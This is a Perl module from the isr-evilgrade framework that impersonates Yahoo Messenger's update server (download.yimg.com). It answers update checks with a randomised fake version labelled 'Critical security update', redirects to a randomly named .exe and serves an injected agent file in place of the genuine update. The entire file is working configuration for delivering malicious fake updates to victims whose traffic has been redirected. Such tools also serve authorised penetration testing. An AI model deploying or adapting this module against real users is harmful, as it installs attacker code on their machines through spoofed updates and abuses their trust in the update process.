###############
# yahoomsn.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::yahoomsn;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'YahooMSN',
    'version'     => '1.0',
    'appver'      => '< 11.0',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => 'download.yimg.com',
    'request'     => [
        {   'req' => '(/updates/wnzpes.txt|/cgi\-bin/updateinfo.cgi)'
            ,    #regex friendly #10.0
            'type'   => 'string',    #file|string|agent|install
            'method' => '',          #any
            'bin'    => 0,
            'string' => "<%VERSION%>\n\\n\\n<%DESCRIPTION%>",
            'parse'  => 1,
            'file'   => '',
        },
        {   'req'    => '/dnldwz.cgi',    #regex friendly
            'type'   => 'string',         #file|string|agent|install
            'method' => '',               #any
            'bin'    => 0,
            'string' =>
                '<html><script>window.location="http://update.winzip.com/winzipupdate<%RND1%>.exe"</script></html>',
            'parse' => 1,
            'file'  => '',
        },

        {   'req'    => '.yim',           #regex friendly
            'type'   => 'agent',          #file|string|agent|install
            'method' => '',               #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.cab', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 0,
            'desc' => 'Status'
        },
        'description' => {
            'val'  => 'Critical security update',
            'desc' => 'Description display in the update'
        },
        'version' => {
            'val' =>
                '\'30.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(4).\'.\'.isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        }
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
